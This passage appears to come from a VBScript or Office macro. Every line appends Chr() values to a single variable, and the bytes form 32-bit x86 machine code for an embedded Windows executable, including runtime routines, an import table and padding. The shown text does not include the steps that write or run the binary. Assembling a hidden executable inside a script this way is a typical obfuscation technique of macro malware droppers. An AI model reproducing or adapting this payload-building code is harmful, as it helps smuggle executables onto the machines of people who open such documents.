ySXd=ySXd&Chr(139)&Chr(93)&Chr(204)&Chr(59)&Chr(223)&Chr(116)&Chr(29)&Chr(87)&Chr(87)&Chr(255)&Chr(117)&Chr(28)&Chr(83)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(87)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(21)&Chr(74)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(96)&Chr(137)&Chr(93)&Chr(224)&Chr(235)&Chr(91)&Chr(139)&Chr(29)&Chr(52)&Chr(128)&Chr(64)&Chr(0)&Chr(57)&Chr(125)&Chr(212)&Chr(117)&Chr(20)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(87)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(211)&Chr(139)&Chr(240)&Chr(59)&Chr(247)&Chr(116)&Chr(60)&Chr(86)&Chr(106)&Chr(1)&Chr(232)&Chr(47)&Chr(209)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(59)&Chr(199)&Chr(116)&Chr(43)&Chr(87)&Chr(87)&Chr(86)&Chr(80)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(87)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(211)&Chr(59)&Chr(199)
ySXd=ySXd&Chr(117)&Chr(14)&Chr(255)&Chr(117)&Chr(224)&Chr(232)&Chr(57)&Chr(208)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(224)&Chr(235)&Chr(11)&Chr(131)&Chr(125)&Chr(220)&Chr(255)&Chr(116)&Chr(5)&Chr(139)&Chr(77)&Chr(208)&Chr(137)&Chr(1)&Chr(255)&Chr(117)&Chr(228)&Chr(232)&Chr(147)&Chr(230)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(69)&Chr(224)&Chr(141)&Chr(101)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(199)&Chr(226)&Chr(255)&Chr(255)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(34)&Chr(200)&Chr(255)&Chr(255)&Chr(15)&Chr(182)&Chr(69)&Chr(8)&Chr(139)&Chr(77)&Chr(240)&Chr(139)&Chr(137)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(4)&Chr(65)&Chr(37)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(128)&Chr(125)
ySXd=ySXd&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(10)&Chr(106)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(104)&Chr(2)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(81)&Chr(141)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(200)&Chr(27)&Chr(192)&Chr(247)&Chr(208)&Chr(35)&Chr(200)&Chr(139)&Chr(196)&Chr(37)&Chr(0)&Chr(240)&Chr(255)&Chr(255)&Chr(59)&Chr(200)&Chr(114)&Chr(10)&Chr(139)&Chr(193)&Chr(89)&Chr(148)&Chr(139)&Chr(0)&Chr(137)&Chr(4)&Chr(36)&Chr(195)&Chr(45)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(133)&Chr(0)&Chr(235)&Chr(233)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(86)&Chr(87)&Chr(255)&Chr(117)&Chr(8)
ySXd=ySXd&Chr(141)&Chr(77)&Chr(236)&Chr(232)&Chr(158)&Chr(199)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(16)&Chr(139)&Chr(117)&Chr(12)&Chr(51)&Chr(255)&Chr(59)&Chr(199)&Chr(116)&Chr(2)&Chr(137)&Chr(48)&Chr(59)&Chr(247)&Chr(117)&Chr(44)&Chr(232)&Chr(19)&Chr(190)&Chr(255)&Chr(255)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(155)&Chr(189)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(128)&Chr(125)&Chr(248)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(244)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(51)&Chr(192)&Chr(233)&Chr(216)&Chr(1)&Chr(0)&Chr(0)&Chr(57)&Chr(125)&Chr(20)&Chr(116)&Chr(12)&Chr(131)&Chr(125)&Chr(20)&Chr(2)&Chr(124)&Chr(201)&Chr(131)&Chr(125)&Chr(20)&Chr(36)&Chr(127)&Chr(195)&Chr(139)&Chr(77)&Chr(236)&Chr(83)&Chr(138)&Chr(30)&Chr(137)&Chr(125)&Chr(252)&Chr(141)&Chr(126)&Chr(1)&Chr(131)
ySXd=ySXd&Chr(185)&Chr(172)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(126)&Chr(23)&Chr(141)&Chr(69)&Chr(236)&Chr(80)&Chr(15)&Chr(182)&Chr(195)&Chr(106)&Chr(8)&Chr(80)&Chr(232)&Chr(6)&Chr(252)&Chr(255)&Chr(255)&Chr(139)&Chr(77)&Chr(236)&Chr(131)&Chr(196)&Chr(12)&Chr(235)&Chr(16)&Chr(139)&Chr(145)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(182)&Chr(195)&Chr(15)&Chr(183)&Chr(4)&Chr(66)&Chr(131)&Chr(224)&Chr(8)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(138)&Chr(31)&Chr(71)&Chr(235)&Chr(199)&Chr(128)&Chr(251)&Chr(45)&Chr(117)&Chr(6)&Chr(131)&Chr(77)&Chr(24)&Chr(2)&Chr(235)&Chr(5)&Chr(128)&Chr(251)&Chr(43)&Chr(117)&Chr(3)&Chr(138)&Chr(31)&Chr(71)&Chr(139)&Chr(69)&Chr(20)&Chr(133)&Chr(192)&Chr(15)&Chr(140)&Chr(75)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(132)&Chr(66)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(36)&Chr(15)&Chr(143)
ySXd=ySXd&Chr(57)&Chr(1)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(42)&Chr(128)&Chr(251)&Chr(48)&Chr(116)&Chr(9)&Chr(199)&Chr(69)&Chr(20)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(52)&Chr(138)&Chr(7)&Chr(60)&Chr(120)&Chr(116)&Chr(13)&Chr(60)&Chr(88)&Chr(116)&Chr(9)&Chr(199)&Chr(69)&Chr(20)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(33)&Chr(199)&Chr(69)&Chr(20)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(10)&Chr(131)&Chr(248)&Chr(16)&Chr(117)&Chr(19)&Chr(128)&Chr(251)&Chr(48)&Chr(117)&Chr(14)&Chr(138)&Chr(7)&Chr(60)&Chr(120)&Chr(116)&Chr(4)&Chr(60)&Chr(88)&Chr(117)&Chr(4)&Chr(71)&Chr(138)&Chr(31)&Chr(71)&Chr(139)&Chr(177)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(184)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(210)&Chr(247)&Chr(117)&Chr(20)&Chr(15)&Chr(182)&Chr(203)&Chr(15)&Chr(183)&Chr(12)&Chr(78)&Chr(246)&Chr(193)&Chr(4)
ySXd=ySXd&Chr(116)&Chr(8)&Chr(15)&Chr(190)&Chr(203)&Chr(131)&Chr(233)&Chr(48)&Chr(235)&Chr(27)&Chr(247)&Chr(193)&Chr(3)&Chr(1)&Chr(0)&Chr(0)&Chr(116)&Chr(49)&Chr(138)&Chr(203)&Chr(128)&Chr(233)&Chr(97)&Chr(128)&Chr(249)&Chr(25)&Chr(15)&Chr(190)&Chr(203)&Chr(119)&Chr(3)&Chr(131)&Chr(233)&Chr(32)&Chr(131)&Chr(193)&Chr(201)&Chr(59)&Chr(77)&Chr(20)&Chr(115)&Chr(25)&Chr(131)&Chr(77)&Chr(24)&Chr(8)&Chr(57)&Chr(69)&Chr(252)&Chr(114)&Chr(39)&Chr(117)&Chr(4)&Chr(59)&Chr(202)&Chr(118)&Chr(33)&Chr(131)&Chr(77)&Chr(24)&Chr(4)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(117)&Chr(35)&Chr(139)&Chr(69)&Chr(24)&Chr(79)&Chr(168)&Chr(8)&Chr(117)&Chr(32)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(116)&Chr(3)&Chr(139)&Chr(125)&Chr(12)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(235)&Chr(91)&Chr(139)&Chr(93)&Chr(252)&Chr(15)&Chr(175)&Chr(93)&Chr(20)&Chr(3)&Chr(217)&Chr(137)
ySXd=ySXd&Chr(93)&Chr(252)&Chr(138)&Chr(31)&Chr(71)&Chr(235)&Chr(139)&Chr(190)&Chr(255)&Chr(255)&Chr(255)&Chr(127)&Chr(168)&Chr(4)&Chr(117)&Chr(27)&Chr(168)&Chr(1)&Chr(117)&Chr(61)&Chr(131)&Chr(224)&Chr(2)&Chr(116)&Chr(9)&Chr(129)&Chr(125)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(119)&Chr(9)&Chr(133)&Chr(192)&Chr(117)&Chr(43)&Chr(57)&Chr(117)&Chr(252)&Chr(118)&Chr(38)&Chr(232)&Chr(114)&Chr(188)&Chr(255)&Chr(255)&Chr(246)&Chr(69)&Chr(24)&Chr(1)&Chr(199)&Chr(0)&Chr(34)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(6)&Chr(131)&Chr(77)&Chr(252)&Chr(255)&Chr(235)&Chr(15)&Chr(246)&Chr(69)&Chr(24)&Chr(2)&Chr(106)&Chr(0)&Chr(88)&Chr(15)&Chr(149)&Chr(192)&Chr(3)&Chr(198)&Chr(137)&Chr(69)&Chr(252)&Chr(139)&Chr(69)&Chr(16)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(137)&Chr(56)&Chr(246)&Chr(69)&Chr(24)&Chr(2)&Chr(116)&Chr(3)&Chr(247)&Chr(93)&Chr(252)&Chr(128)
ySXd=ySXd&Chr(125)&Chr(248)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(244)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(139)&Chr(69)&Chr(252)&Chr(235)&Chr(24)&Chr(139)&Chr(69)&Chr(16)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(137)&Chr(48)&Chr(128)&Chr(125)&Chr(248)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(244)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(51)&Chr(192)&Chr(91)&Chr(95)&Chr(94)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(51)&Chr(192)&Chr(80)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(57)&Chr(5)&Chr(148)&Chr(178)&Chr(64)&Chr(0)&Chr(117)&Chr(7)&Chr(104)&Chr(240)&Chr(169)&Chr(64)&Chr(0)&Chr(235)&Chr(1)&Chr(80)&Chr(232)&Chr(171)&Chr(253)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)
ySXd=ySXd&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(86)&Chr(83)&Chr(139)&Chr(77)&Chr(16)&Chr(11)&Chr(201)&Chr(116)&Chr(77)&Chr(139)&Chr(117)&Chr(8)&Chr(139)&Chr(125)&Chr(12)&Chr(183)&Chr(65)&Chr(179)&Chr(90)&Chr(182)&Chr(32)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(38)&Chr(10)&Chr(228)&Chr(138)&Chr(7)&Chr(116)&Chr(39)&Chr(10)&Chr(192)&Chr(116)&Chr(35)&Chr(131)&Chr(198)&Chr(1)&Chr(131)&Chr(199)&Chr(1)&Chr(58)&Chr(231)&Chr(114)&Chr(6)&Chr(58)&Chr(227)&Chr(119)&Chr(2)&Chr(2)&Chr(230)&Chr(58)&Chr(199)&Chr(114)&Chr(6)&Chr(58)&Chr(195)&Chr(119)&Chr(2)&Chr(2)&Chr(198)&Chr(58)&Chr(224)&Chr(117)&Chr(11)&Chr(131)&Chr(233)&Chr(1)&Chr(117)&Chr(209)&Chr(51)&Chr(201)&Chr(58)&Chr(224)&Chr(116)&Chr(9)&Chr(185)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(114)&Chr(2)&Chr(247)&Chr(217)&Chr(139)&Chr(193)&Chr(91)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(204)&Chr(204)&Chr(204)
ySXd=ySXd&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(86)&Chr(139)&Chr(68)&Chr(36)&Chr(20)&Chr(11)&Chr(192)&Chr(117)&Chr(40)&Chr(139)&Chr(76)&Chr(36)&Chr(16)&Chr(139)&Chr(68)&Chr(36)&Chr(12)&Chr(51)&Chr(210)&Chr(247)&Chr(241)&Chr(139)&Chr(216)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(247)&Chr(241)&Chr(139)&Chr(240)&Chr(139)&Chr(195)&Chr(247)&Chr(100)&Chr(36)&Chr(16)&Chr(139)&Chr(200)&Chr(139)&Chr(198)&Chr(247)&Chr(100)&Chr(36)&Chr(16)&Chr(3)&Chr(209)&Chr(235)&Chr(71)&Chr(139)&Chr(200)&Chr(139)&Chr(92)&Chr(36)&Chr(16)&Chr(139)&Chr(84)&Chr(36)&Chr(12)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(209)&Chr(233)&Chr(209)&Chr(219)&Chr(209)&Chr(234)&Chr(209)&Chr(216)&Chr(11)&Chr(201)&Chr(117)&Chr(244)&Chr(247)&Chr(243)&Chr(139)&Chr(240)&Chr(247)&Chr(100)&Chr(36)&Chr(20)&Chr(139)&Chr(200)&Chr(139)&Chr(68)&Chr(36)
ySXd=ySXd&Chr(16)&Chr(247)&Chr(230)&Chr(3)&Chr(209)&Chr(114)&Chr(14)&Chr(59)&Chr(84)&Chr(36)&Chr(12)&Chr(119)&Chr(8)&Chr(114)&Chr(15)&Chr(59)&Chr(68)&Chr(36)&Chr(8)&Chr(118)&Chr(9)&Chr(78)&Chr(43)&Chr(68)&Chr(36)&Chr(16)&Chr(27)&Chr(84)&Chr(36)&Chr(20)&Chr(51)&Chr(219)&Chr(43)&Chr(68)&Chr(36)&Chr(8)&Chr(27)&Chr(84)&Chr(36)&Chr(12)&Chr(247)&Chr(218)&Chr(247)&Chr(216)&Chr(131)&Chr(218)&Chr(0)&Chr(139)&Chr(202)&Chr(139)&Chr(211)&Chr(139)&Chr(217)&Chr(139)&Chr(200)&Chr(139)&Chr(198)&Chr(94)&Chr(194)&Chr(16)&Chr(0)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(76)&Chr(36)&Chr(16)&Chr(11)&Chr(200)&Chr(139)&Chr(76)&Chr(36)&Chr(12)&Chr(117)&Chr(9)&Chr(139)&Chr(68)&Chr(36)&Chr(4)&Chr(247)&Chr(225)&Chr(194)&Chr(16)&Chr(0)&Chr(83)&Chr(247)&Chr(225)
ySXd=ySXd&Chr(139)&Chr(216)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(247)&Chr(100)&Chr(36)&Chr(20)&Chr(3)&Chr(216)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(247)&Chr(225)&Chr(3)&Chr(211)&Chr(91)&Chr(194)&Chr(16)&Chr(0)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(141)&Chr(66)&Chr(255)&Chr(91)&Chr(195)&Chr(141)&Chr(164)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(100)&Chr(36)&Chr(0)&Chr(51)&Chr(192)&Chr(138)&Chr(68)&Chr(36)&Chr(8)&Chr(83)&Chr(139)&Chr(216)&Chr(193)&Chr(224)&Chr(8)&Chr(139)&Chr(84)&Chr(36)&Chr(8)&Chr(247)&Chr(194)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(21)&Chr(138)&Chr(10)&Chr(131)&Chr(194)&Chr(1)&Chr(58)&Chr(203)&Chr(116)&Chr(207)&Chr(132)&Chr(201)&Chr(116)&Chr(81)&Chr(247)&Chr(194)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(235)&Chr(11)&Chr(216)&Chr(87)
ySXd=ySXd&Chr(139)&Chr(195)&Chr(193)&Chr(227)&Chr(16)&Chr(86)&Chr(11)&Chr(216)&Chr(139)&Chr(10)&Chr(191)&Chr(255)&Chr(254)&Chr(254)&Chr(126)&Chr(139)&Chr(193)&Chr(139)&Chr(247)&Chr(51)&Chr(203)&Chr(3)&Chr(240)&Chr(3)&Chr(249)&Chr(131)&Chr(241)&Chr(255)&Chr(131)&Chr(240)&Chr(255)&Chr(51)&Chr(207)&Chr(51)&Chr(198)&Chr(131)&Chr(194)&Chr(4)&Chr(129)&Chr(225)&Chr(0)&Chr(1)&Chr(1)&Chr(129)&Chr(117)&Chr(28)&Chr(37)&Chr(0)&Chr(1)&Chr(1)&Chr(129)&Chr(116)&Chr(211)&Chr(37)&Chr(0)&Chr(1)&Chr(1)&Chr(1)&Chr(117)&Chr(8)&Chr(129)&Chr(230)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(117)&Chr(196)&Chr(94)&Chr(95)&Chr(91)&Chr(51)&Chr(192)&Chr(195)&Chr(139)&Chr(66)&Chr(252)&Chr(58)&Chr(195)&Chr(116)&Chr(54)&Chr(132)&Chr(192)&Chr(116)&Chr(239)&Chr(58)&Chr(227)&Chr(116)&Chr(39)&Chr(132)&Chr(228)&Chr(116)&Chr(231)&Chr(193)&Chr(232)&Chr(16)&Chr(58)&Chr(195)&Chr(116)&Chr(21)
ySXd=ySXd&Chr(132)&Chr(192)&Chr(116)&Chr(220)&Chr(58)&Chr(227)&Chr(116)&Chr(6)&Chr(132)&Chr(228)&Chr(116)&Chr(212)&Chr(235)&Chr(150)&Chr(94)&Chr(95)&Chr(141)&Chr(66)&Chr(255)&Chr(91)&Chr(195)&Chr(141)&Chr(66)&Chr(254)&Chr(94)&Chr(95)&Chr(91)&Chr(195)&Chr(141)&Chr(66)&Chr(253)&Chr(94)&Chr(95)&Chr(91)&Chr(195)&Chr(141)&Chr(66)&Chr(252)&Chr(94)&Chr(95)&Chr(91)&Chr(195)&Chr(255)&Chr(37)&Chr(196)&Chr(128)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(150)&Chr(0)&Chr(0)&Chr(134)&Chr(150)&Chr(0)&Chr(0)&Chr(152)&Chr(150)&Chr(0)&Chr(0)&Chr(182)&Chr(150)&Chr(0)&Chr(0)&Chr(202)&Chr(150)&Chr(0)&Chr(0)&Chr(210)&Chr(150)&Chr(0)&Chr(0)&Chr(228)&Chr(150)&Chr(0)&Chr(0)&Chr(242)&Chr(150)&Chr(0)&Chr(0)&Chr(254)&Chr(150)&Chr(0)&Chr(0)&Chr(14)&Chr(151)&Chr(0)&Chr(0)&Chr(36)&Chr(151)&Chr(0)&Chr(0)&Chr(62)&Chr(151)&Chr(0)&Chr(0)&Chr(86)&Chr(151)&Chr(0)&Chr(0)&Chr(112)&Chr(151)&Chr(0)&Chr(0)&Chr(134)&Chr(151)&Chr(0)&Chr(0)&Chr(150)&Chr(151)&Chr(0)&Chr(0)&Chr(176)&Chr(151)&Chr(0)&Chr(0)&Chr(194)&Chr(151)&Chr(0)&Chr(0)&Chr(208)&Chr(151)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(232)&Chr(151)&Chr(0)&Chr(0)&Chr(246)&Chr(151)&Chr(0)&Chr(0)&Chr(2)&Chr(152)&Chr(0)&Chr(0)&Chr(16)&Chr(152)&Chr(0)&Chr(0)&Chr(26)&Chr(152)&Chr(0)&Chr(0)&Chr(50)&Chr(152)&Chr(0)&Chr(0)&Chr(66)&Chr(152)&Chr(0)&Chr(0)&Chr(88)&Chr(152)&Chr(0)&Chr(0)&Chr(112)&Chr(152)&Chr(0)&Chr(0)&Chr(126)&Chr(152)&Chr(0)&Chr(0)&Chr(140)&Chr(152)&Chr(0)&Chr(0)&Chr(152)&Chr(152)&Chr(0)&Chr(0)&Chr(178)&Chr(152)&Chr(0)&Chr(0)&Chr(194)&Chr(152)&Chr(0)&Chr(0)&Chr(216)&Chr(152)&Chr(0)&Chr(0)&Chr(242)&Chr(152)&Chr(0)&Chr(0)&Chr(10)&Chr(153)&Chr(0)&Chr(0)&Chr(34)&Chr(153)&Chr(0)&Chr(0)&Chr(54)&Chr(153)&Chr(0)&Chr(0)&Chr(74)&Chr(153)&Chr(0)&Chr(0)&Chr(102)&Chr(153)&Chr(0)&Chr(0)&Chr(122)&Chr(153)&Chr(0)&Chr(0)&Chr(138)&Chr(153)&Chr(0)&Chr(0)&Chr(178)&Chr(153)&Chr(0)&Chr(0)&Chr(190)&Chr(153)&Chr(0)&Chr(0)
